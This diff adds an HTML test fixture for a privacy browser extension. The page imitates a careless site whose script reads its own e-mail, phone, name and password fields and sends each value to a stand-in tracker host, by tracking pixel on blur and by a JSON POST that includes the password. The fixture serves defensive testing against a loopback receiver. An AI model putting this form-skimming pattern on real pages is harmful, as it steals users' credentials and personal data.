@@ -1,0 +1,82 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <title>privacy: protect canaries</title>
+  </head>
+  <body>
+    <!--
+      ADR-020 «Защита», privacy scan run 2 (scripts/privacy-scan.mjs, S15). Opened at http://www.example.com:<stand port>/
+      privacy/protect-canary-page.html?rp=<receiver port>; *.example.{com,net,org} resolve to the loopback stand
+      (--host-resolver-rules). The scan TYPES the canaries of fixtures/privacy/canaries.json (key `protect`) into the four
+      fields with trusted input. The page plays a careless site with a third party: it reads its OWN fields and sends
+      every value in plain text and as SHA-256 to tracker.example.net — a pixel per field on blur (query) and, on
+      #send-all, one POST with a JSON body that also holds the password. Nothing of this may reach the extension's
+      storage, exports, logs or wire (only keyed fingerprints of e-mail / phone / name go ISOLATED -> SW). The receiver
+      route (tests/fixture-routes/forms.mjs) answers 204 and never reads bodies or query values.
+    -->
+    <h1 id="title">Protect canaries</h1>
+    <form id="form" action="#" onsubmit="return false" autocomplete="on">
+      <label>E-mail <input id="email" name="email" type="email" autocomplete="email" /></label>
+      <label>Phone <input id="phone" name="phone" type="tel" autocomplete="tel" /></label>
+      <label>Name <input id="name" name="full_name" type="text" autocomplete="name" /></label>
+      <label>Password <input id="password" name="password" type="password" autocomplete="current-password" /></label>
+      <button id="send-all" type="button">Send all</button>
+    </form>
+    <script src="../protect/forms/lib.js"></script>
+    <script>
+      (function () {
+        'use strict';
+        var lib = window.formsLib;
+        var ids = ['email', 'phone', 'name', 'password'];
+        // passwordReads: the page's own reads of its password field (the MAIN tripwire of the test profile counts them;
+        // the scan requires the tripwire count to equal this number, i.e. no read by the extension).
+        var counts = { pixels: 0, posts: 0, passwordReads: 0 };
+        window.__fixtureResult.fixture = 'protect-canary-page';
+        window.__fixtureResult.counts = counts;
+
+        function own(id) {
+          if (id === 'password') counts.passwordReads++;
+          return document.getElementById(id).value;
+        }
+
+        ids.forEach(function (id) {
+          document.getElementById(id).addEventListener('blur', function () {
+            var value = own(id);
+            if (value.length === 0) return;
+            var norm = value.trim().toLowerCase();
+            var img = new Image();
+            img.src = lib.receiver('px.tracker.example.net') + '/tr?f=' + id + '&v=' + encodeURIComponent(value) + '&h=' + lib.sha256Hex(norm);
+            counts.pixels++;
+            lib.note('pixel-' + id);
+          });
+        });
+
+        document.getElementById('send-all').addEventListener('click', function () {
+          var body = {};
+          ids.forEach(function (id) {
+            var value = own(id);
+            body[id] = value;
+            body[id + '_sha256'] = lib.sha256Hex(value.trim().toLowerCase());
+          });
+          fetch(lib.receiver('collect.tracker.example.net') + '/fsink/collect', {
+            method: 'POST',
+            mode: 'no-cors',
+            cache: 'no-store',
+            headers: { 'content-type': 'text/plain' },
+            body: JSON.stringify(body),
+          }).then(
+            function () {
+              counts.posts++;
+              lib.note('post');
+            },
+            function () {
+              counts.posts++;
+              lib.note('post-failed');
+            },
+          );
+        });
+      })();
+    </script>
+  </body>
+</html>
